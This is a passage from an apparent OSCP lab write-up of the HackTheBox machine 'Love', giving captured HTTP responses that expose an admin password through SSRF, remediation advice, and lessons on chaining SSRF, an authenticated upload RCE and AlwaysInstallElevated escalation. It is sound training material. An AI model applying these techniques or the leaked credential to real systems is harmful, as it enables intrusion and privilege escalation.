04/12/2021  01:34 PM           148,272 CredentialUIBroker.exe
12/07/2019  02:09 AM           327,680 DaOtpCredentialProvider.dll
12/07/2019  02:08 AM            69,120 DeviceCredential.dll
04/12/2021  01:33 PM            82,432 DeviceCredentialDeployment.exe
11/18/2020  07:49 PM            13,312 dstokenclean.exe
04/12/2021  01:34 PM           593,408 facecredentialprovider.dll
04/12/2021  01:34 PM           106,496 fingerprintcredential.dll
04/12/2021  01:33 PM           110,592 HashtagDS.dll
04/12/2021  01:33 PM           236,544 MicrosoftAccountTokenProvider.dll
12/07/2019  02:08 AM            68,912 NtlmShared.dll
```

### Additional captured source values

#### `loot/admin-login.txt`

```text
HTTP/1.1 302 Found
Date: Fri, 11 Sep 2026 09:57:22 GMT
Server: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
X-Powered-By: PHP/7.3.27
Set-Cookie: PHPSESSID=iuietba9hod4omlbp0i3cg2g3i; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
location: index.php
Content-Length: 0
Content-Type: text/html; charset=UTF-8
```

#### `loot/http-root.txt`

```text
HTTP/1.1 200 OK
Date: Fri, 11 Sep 2026 09:43:04 GMT
Server: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
X-Powered-By: PHP/7.3.27
Set-Cookie: PHPSESSID=74g2eli74jofqop6o7kiik1f20; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Length: 4388
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<title>Voting System using PHP</title>
	<!-- Tell the browser to be responsive to screen width -->
	<meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
	<!-- Bootstrap 3.3.7 -->
	<link rel="stylesheet" href="bower_components/bootstrap/dist/css/bootstrap.min.css">
    <!-- iCheck for checkboxes and radio inputs -->
    <link rel="stylesheet" href="plugins/iCheck/all.css">
	<!-- DataTables -->
    <link rel="stylesheet" href="bower_components/datatables.net-bs/css/dataTables.bootstrap.min.css">
	<!-- Font Awesome -->
	<link rel="stylesheet" href="bower_components/font-awesome/css/font-awesome.min.css">
	<!-- Theme style -->
	<link rel="stylesheet" href="dist/css/AdminLTE.min.css">
	<!-- AdminLTE Skins. Choose a skin from the css/skins
       folder instead of downloading all of them to reduce the load. -->
	<link rel="stylesheet" href="dist/css/skins/_all-skins.min.css">

	<!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
	<!--[if lt IE 9]>
	<script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
	<script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
	<![endif]-->

	<!-- Google Font -->
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:300,400,600,700,300italic,400italic,600italic">

	<style>
		.mt20{
        margin-top: 20px;
      }
      .title{
        font-size: 50px;
      }
      #candidate_list{
        margin-top:20px;
      }

      #candidate_list ul{
        list-style-type:none;
      }

      #candidate_list ul li{
        margin:0 30px 30px 0;
        vertical-align:top
      }

      .clist{
        margin-left: 20px;
      }

      .cname{
        font-size: 25px;
      }

      .votelist{
        font-size: 17px;
      }
	</style>
</head><body class="hold-transition login-page">
<div class="login-box">
	<div class="login-logo">
		<b>Voting System</b>
	</div>

	<div class="login-box-body">
	<p class="login-box-msg">Sign in to start your session</p>

	<form action="login.php" method="POST">
		<div class="form-group has-feedback">
		<input type="text" class="form-control" name="voter" placeholder="Voter's ID" required>
		<span class="glyphicon glyphicon-user form-control-feedback"></span>
		</div>
          <div class="form-group has-feedback">
            <input type="password" class="form-control" name="password" placeholder="Password" required>
            <span class="glyphicon glyphicon-lock form-control-feedback"></span>
          </div>
		<div class="row">
			<div class="col-xs-4">
			<button type="submit" class="btn btn-primary btn-block btn-flat" name="login"><i class="fa fa-sign-in"></i> Sign In</button>
		</div>
		</div>
	</form>
	</div>
	</div>

<!-- jQuery 3 -->
<script src="bower_components/jquery/dist/jquery.min.js"></script>
<!-- Bootstrap 3.3.7 -->
<script src="bower_components/bootstrap/dist/js/bootstrap.min.js"></script>
<!-- iCheck 1.0.1 -->
<script src="plugins/iCheck/icheck.min.js"></script>
<!-- DataTables -->
<script src="bower_components/datatables.net/js/jquery.dataTables.min.js"></script>
<script src="bower_components/datatables.net-bs/js/dataTables.bootstrap.min.js"></script>
<!-- SlimScroll -->
<script src="bower_components/jquery-slimscroll/jquery.slimscroll.min.js"></script>
<!-- FastClick -->
<script src="bower_components/fastclick/lib/fastclick.js"></script>
<!-- AdminLTE App -->
<script src="dist/js/adminlte.min.js"></script>
<!-- Data Table Initialize -->
<script>
  $(function () {
    $('#example1').DataTable()
	var bookTable = $('#booklist').DataTable({
      'paging'      : true,
      'lengthChange': false,
      'searching'   : true,
      'ordering'    : true,
      'info'        : false,
      'autoWidth'   : false
    })

    $('#searchBox').on('keyup', function(){
	bookTable.search(this.value).draw();
	});

  })
</script></body>
</html>
```

#### `loot/ssrf-5000.txt`

```text
HTTP/1.1 200 OK
Date: Fri, 11 Sep 2026 09:54:17 GMT
Server: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
X-Powered-By: PHP/7.3.27
Transfer-Encoding: chunked
Content-Type: text/html; charset=UTF-8

<html>
<title> File security checker </title>



<!DOCTYPE html>
<html>

  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Secure file scanner</title>
    <link href="font.css" rel="stylesheet">
    <link rel="stylesheet" href="style.css" />
    <link rel="stylesheet" type="text/css" href="../css/register.css">

    <script>
  function validateForm() {
    var x = document.forms["fileform"]["file"].value;
    if (x == "") {
    alert("Please enter a file url to scan");
    return false;
  }


}
    </script>
  </head>

  <body>

  <title> File security checker </title>
<link rel="stylesheet" href="style.css">


<nav class="navbar" role="navigation" aria-label="main navigation">
  <div class="navbar-brand">
  <a class="navbar-item" href="/">
    <h1 class="title is-4">Free File Scanner</h1>
    </a>

    <a role="button" class="navbar-burger" aria-label="menu" aria-expanded="false" data-target="navbarBasicExample">
      <span aria-hidden="true"></span>
      <span aria-hidden="true"></span>
      <span aria-hidden="true"></span>
    </a>
  </div>

  <div id="navbarBasicExample" class="navbar-menu">
    <div class="navbar-start">
      <a class="navbar-item" href='http://staging.love.htb/index.php'>
        Home
      </a>

      <a class="navbar-item" href='#'>
        Demo
      </a>
    </div>

    <div class="navbar-end">
      <div class="navbar-item">

      </div>
    </div>
  </div>
</nav>
    <section class="container">
      <div class="columns is-multiline">
        <div class="column is-8 is-offset-2 register">
          <div class="columns">

          <div class="column">


  <form name="fileform" method=post action="/beta.php" onsubmit="return validateForm()">
    <div class="field">
  <label class="label">Specify the file url: </label>
  <div class="control">
    <input class="input" type="text" name=file placeholder="File to scan">
  </div>
  <p class="help">Enter the url of the file to scan</p>
</div>

<input
  type=submit
  name=read
  class="button is-medium is-fullwidth is-success is-focused"
  value="Scan file">

</form>

<!DOCTYPE html>
<html>

  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Secure file scanner</title>
    <link href="font.css" rel="stylesheet">
    <link rel="stylesheet" href="style.css" />
    <link rel="stylesheet" type="text/css" href="../css/register.css">
  </head>

  <body>

  <title> File security checker </title>
<link rel="stylesheet" href="style.css">


<nav class="navbar is-warning" role="navigation" aria-label="main navigation">
  <div class="navbar-brand">
    <a class="navbar-item" href="/">
    <h1 class="title is-4">Password Dashboard</h1>
    </a>

    <a role="button" class="navbar-burger" aria-label="menu" aria-expanded="false" data-target="navbarBasicExample">
      <span aria-hidden="true"></span>
      <span aria-hidden="true"></span>
      <span aria-hidden="true"></span>
    </a>
  </div>

  <div id="navbarBasicExample" class="navbar-menu">
    <div class="navbar-start">
      <a class="navbar-item" href='http://staging.love.htb/index.php'>
        Home
      </a>

      <a class="navbar-item" href='http://staging.love.htb/beta.php'>
        Demo
      </a>
    </div>

  </div>
</nav>








<section class="container">
      <div class="columns is-multiline">
        <div class="column is-8 is-offset-2 register">
          <div class="columns">

          <div class="column">



  <article class="message is-warning">
<div class="message-header">
  <p>Voting system Administration</p>
  <button class="delete" aria-label="delete"></button>
</div>
<div class="message-body">

<article class="message is-link">
  <div class="message-body">

<strong>Vote Admin Creds admin: @LoveIsInTheAir!!!!
</strong><br>  </div>
</article>

</div>
</article>



  </div>
          </div>
        </div>
        <div class="column is-8 is-offset-2">
          <br>
          <nav class="level">
            <div class="level-left">
              <div class="level-item">
                <span class="icon">
                  <i class="fab fa-twitter"></i>
                </span> &emsp;
                <span class="icon">
                  <i class="fab fa-facebook"></i>
                </span> &emsp;
                <span class="icon">
                  <i class="fab fa-instagram"></i>
                </span> &emsp;
                <span class="icon">
                  <i class="fab fa-github"></i>
                </span> &emsp;
                <span class="icon">
                  <i class="fas fa-envelope"></i>
                </span>
              </div>
            </div>
            <div class="level-right">
              <small class="level-item" style="color: var(--textLight)">
                &copy; Valentine Corpotation. All Rights Reserved.
              </small>
            </div>
          </nav>
        </div>
      </div>
    </section>
  </body>
  <style>
    :root {
      --brandColor: hsl(166, 67%, 51%);
      --background: rgb(247, 247, 247);
      --textDark: hsla(0, 0%, 0%, 0.66);
      --textLight: hsla(0, 0%, 0%, 0.33);
    }

    body {
      background: var(--background);
      height: 100vh;
      color: var(--textDark);
    }

    .field:not(:last-child) {
      margin-bottom: 1rem;
    }

    .register {
      margin-top: 10rem;
      background: white;
      border-radius: 10px;
    }

    .left,
    .right {
      padding: 4.5rem;
    }

    .left {
      border-right: 5px solid var(--background);
    }

    .left .title {
      font-weight: 800;
      letter-spacing: -2px;
    }

    .left .colored {
      color: var(--brandColor);
      font-weight: 500;
      margin-top: 1rem !important;
      letter-spacing: -1px;
    }

    .left p {
      color: var(--textLight);
      font-size: 1.15rem;
    }

    .right .title {
      font-weight: 800;
      letter-spacing: -1px;
    }

    .right .description {
      margin-top: 1rem;
      margin-bottom: 1rem !important;
      color: var(--textLight);
      font-size: 1.15rem;
    }

    .right small {
      color: var(--textLight);
    }

    input {
      font-size: 1rem;
    }

    input:focus {
      border-color: var(--brandColor) !important;
      box-shadow: 0 0 0 1px var(--brandColor) !important;
    }

    .fab,
    .fas {
      color: var(--textLight);
      margin-right: 1rem;
    }

  </style>

</html>
  </div>
          </div>
        </div>
        <div class="column is-8 is-offset-2">
          <br>
          <nav class="level">
            <div class="level-left">
              <div class="level-item">
                <span class="icon">
                  <i class="fab fa-twitter"></i>
                </span> &emsp;
                <span class="icon">
                  <i class="fab fa-facebook"></i>
                </span> &emsp;
                <span class="icon">
                  <i class="fab fa-instagram"></i>
                </span> &emsp;
                <span class="icon">
                  <i class="fab fa-github"></i>
                </span> &emsp;
                <span class="icon">
                  <i class="fas fa-envelope"></i>
                </span>
              </div>
            </div>
            <div class="level-right">
              <small class="level-item" style="color: var(--textLight)">
                &copy; Valentine Corpotation. All Rights Reserved.
              </small>
            </div>
          </nav>
        </div>
      </div>
    </section>
  </body>
  <style>
    :root {
      --brandColor: hsl(166, 67%, 51%);
      --background: rgb(247, 247, 247);
      --textDark: hsla(0, 0%, 0%, 0.66);
      --textLight: hsla(0, 0%, 0%, 0.33);
    }

    body {
      background: var(--background);
      height: 100vh;
      color: var(--textDark);
    }

    .field:not(:last-child) {
      margin-bottom: 1rem;
    }

    .register {
      margin-top: 10rem;
      background: white;
      border-radius: 10px;
    }

    .left,
    .right {
      padding: 4.5rem;
    }

    .left {
      border-right: 5px solid var(--background);
    }

    .left .title {
      font-weight: 800;
      letter-spacing: -2px;
    }

    .left .colored {
      color: var(--brandColor);
      font-weight: 500;
      margin-top: 1rem !important;
      letter-spacing: -1px;
    }

    .left p {
      color: var(--textLight);
      font-size: 1.15rem;
    }

    .right .title {
      font-weight: 800;
      letter-spacing: -1px;
    }

    .right .description {
      margin-top: 1rem;
      margin-bottom: 1rem !important;
      color: var(--textLight);
      font-size: 1.15rem;
    }

    .right small {
      color: var(--textLight);
    }

    input {
      font-size: 1rem;
    }

    input:focus {
      border-color: var(--brandColor) !important;
      box-shadow: 0 0 0 1px var(--brandColor) !important;
    }

    .fab,
    .fas {
      color: var(--textLight);
      margin-right: 1rem;
    }

  </style>

</html>
```


## Remediation recommendations

| Finding | Recommendation |
|---|---|
| Initial access path on Love | Remove or patch the vulnerable service, restrict exposure, and rotate any credentials recovered during testing. |
| Privilege escalation path | Remove the misconfiguration, enforce least privilege, and verify the corrected permissions or policy. |
| Assessment artifacts | Remove payloads and temporary files, restore modified files, and review logs for the test activity. |

## Lessons learned and vault links

- Compare virtual-host responses before concluding that a protected port is inaccessible. A 403 on an internal service can be a routing clue, not a dead end.
- Treat URL-fetching features as SSRF candidates and begin with a safe localhost service request.
- A successful upload status or redirect is not code execution. Always request the stored path and run a harmless identity command.
- Read a public proof of concept to recover the exact endpoint and multipart field names. The working Love route was the voter-add handler, not the first candidate-photo route tested.
- `AlwaysInstallElevated` requires both policy hives. When the condition is met, an MSI can be the cleanest path through an AppLocker-constrained Windows host.
- Keep screenshots and reports free of credentials, cookies, hashes, and flags. Store sensitive evidence privately and describe only the validation result.

### Related boxes

- [[OSCP/BOXES/WRITE UPS/Windows/Bastard|Bastard]] -- Apache/PHP web exploitation followed by Windows token privilege triage.
- [[OSCP/BOXES/WRITE UPS/Windows/Buff|Buff]] -- authenticated-style web upload behavior and a Windows reverse-shell handoff.
- [[OSCP/BOXES/WRITE UPS/Windows/Devel|Devel]] -- web upload to a Windows shell followed by local privilege enumeration.
- [[OSCP/BOXES/WRITE UPS/Windows/Jerry|Jerry]] -- Apache/Tomcat webshell execution and Windows identity proof.
- [[OSCP/BOXES/WRITE UPS/Windows/Conceal|Conceal]] -- standalone Windows web foothold and SYSTEM escalation through a different token path.

## External resources

- [Exploit-DB 49445: Voting System 1.0 authenticated file upload RCE](https://www.exploit-db.com/exploits/49445)
- [Microsoft: AlwaysInstallElevated policy](https://learn.microsoft.com/en-us/windows/win32/msi/alwaysinstallelevated)
- [Microsoft: AppLocker overview](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/applocker-overview)
- [Nmap Reference Guide](https://nmap.org/book/man.html)
- [RevShells](https://www.revshells.com/)

## Related RUNBOOK V2 stages

- [[OSCP/RUNBOOK V2/Start Here]]
- [[OSCP/RUNBOOK V2/Windows - Service Scan]]
- [[OSCP/RUNBOOK V2/Windows - Web Enum]]
- [[OSCP/RUNBOOK V2/Windows - Shell Received]]
- [[OSCP/RUNBOOK V2/Windows - Privilege Triage]]
- [[OSCP/RUNBOOK V2/Windows - Clean Down]]

## Why this matters for OSCP

Love rewards disciplined enumeration, proof-driven transitions, and a clean record of what changed. The same habits transfer directly to OSCP time pressure.
